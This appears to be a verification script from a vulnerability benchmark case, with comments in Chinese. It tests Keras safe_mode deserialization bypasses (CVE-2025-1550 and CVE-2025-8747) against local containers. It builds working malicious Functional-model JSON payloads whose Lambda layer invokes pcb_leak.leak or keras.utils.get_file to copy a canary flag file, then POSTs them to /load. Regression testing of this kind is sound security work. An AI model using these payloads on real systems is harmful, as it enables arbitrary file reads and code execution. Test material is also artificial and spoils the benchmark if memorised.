#!/usr/bin/env bash
# verify.sh --seed|--residual — deser_keras_safe_mode (PCBV2-0098)
#
# 机制：Keras v3 safe_mode=True 反序列化（POST /load -> keras.saving.load_model），
#       Lambda 层 function 节点被 serialization_lib._retrieve_class_or_fn 解析并调用
#       （CVE-2025-1550）。flag 由容器入口plant在 /canary/flag.txt；被调用的 callable
#       把它拷贝进 /out，/load 响应 leaked 字段回显。
#   seed     = CVE-2025-1550 原形：Lambda.function -> {"module":"pcb_leak","config":"leak"}
#              （包外模块）。V0(keras 3.8.0) 无 allowlist -> pcb_leak.leak 解析+运行 -> flag
#              V1(keras 3.9.0) CVE-2025-1550 修复（包 allowlist 仅 {keras,...}）-> 拒绝导入 -> 阻断
#   residual = CVE-2025-8747 残留：包 allowlist 只查顶层包、不限制包内 callable，所以
#              IN-ALLOWLIST 的 keras.utils.get_file 仍可被 Lambda 解析+调用
#              （origin=file:///canary/flag.txt -> /out 本地拷贝 -> flag 泄出）。
#              V1(3.9.0) 达效果；V2(3.11.0) LOADING_APIS denylist 拦 get_file -> 阻断
# 效果通道 = POST /load 响应 body 的 leaked 字段（= 容器内 $PCB_FLAG）。
# 本实现自包含：候选 config 内嵌字面量（seed/residual 同构），直接 POST 动态解析端口，
# 不依赖 seed_exec 的固定 PORT 表（与 compose 动态端口迁移保持一致）。
# 退出码：0=效果发生(flag 出现) 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退固定端口
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8000}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=18850;; v1) PORT=18851;; v2) PORT=18852;;
  esac
fi
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"

# 就绪等待：gunicorn 冷启动 keras 较慢，轮询 /health
for _ in $(seq 1 120); do
  if curl -s -o /dev/null -m 3 "http://127.0.0.1:$PORT/health"; then break; fi
  sleep 2
done

OUT="$("$PY" - "$MODE" "$PORT" "$RUN_FLAG" "$VERSION" <<'PYEOF'
import json, sys, urllib.error, urllib.request

mode, port, flag, version = sys.argv[1:5]
base = "http://127.0.0.1:%s" % port

_INPUT = {"module": "keras.layers", "class_name": "InputLayer",
          "config": {"batch_shape": [None, 1], "dtype": "float32", "name": "in"},
          "registered_name": None, "name": "in", "inbound_nodes": []}
_KT = {"class_name": "__keras_tensor__",
       "config": {"shape": [None, 1], "dtype": "float32", "keras_history": ["in", 0, 0]}}


def _cfg(fn, args):
    lam = {"module": "keras.layers", "class_name": "Lambda",
           "config": {"name": "lam", "trainable": True, "function": fn,
                      "arguments": args, "output_shape": [1]},
           "registered_name": None, "name": "lam",
           "inbound_nodes": [{"args": [_KT], "kwargs": {}}]}
    return {"module": "keras.src.models.functional", "class_name": "Functional",
            "config": {"name": "functional", "trainable": True,
                       "layers": [_INPUT, lam],
                       "input_layers": [["in", 0, 0]], "output_layers": [["lam", 0, 0]]},
            "registered_name": "Functional"}


if mode == "--seed":
    # CVE-2025-1550 原形：包外 pcb_leak.leak（V0 达效果 / V1 allowlist 阻断）
    fn = {"module": "pcb_leak", "class_name": "function", "config": "leak",
          "registered_name": "function"}
    args = {"flag_path": "/canary/flag.txt", "out_path": "/out/orig_leak.txt"}
    label = "seed"
else:
    # CVE-2025-8747 残留：IN-ALLOWLIST keras.utils.get_file（V1 达效果 / V2 denylist 阻断）
    fn = {"module": "keras.utils", "class_name": "function", "config": "get_file",
          "registered_name": "function"}
    args = {"origin": "file:///canary/flag.txt", "cache_dir": "/out",
            "cache_subdir": "", "force_download": True}
    label = "residual"

body = json.dumps(_cfg(fn, args)).encode()
req = urllib.request.Request(base + "/load", data=body,
                             headers={"Content-Type": "application/json"})
try:
    with urllib.request.urlopen(req, timeout=180) as r:
        resp = r.read().decode("utf-8", "replace")
except urllib.error.HTTPError as e:
    resp = e.read().decode("utf-8", "replace")
except Exception as e:
    print("verify: connection failed: %s" % e, file=sys.stderr)
    sys.exit(20)
print("[%s %s] POST /load -> %s" % (version, label, resp[:200]))
sys.exit(0 if flag in resp else 10)
PYEOF
)"
rc=$?
echo "$OUT"
echo "verify[$MODE] version=$VERSION rc=$rc (flag=$RUN_FLAG)" >&2
exit "$rc"
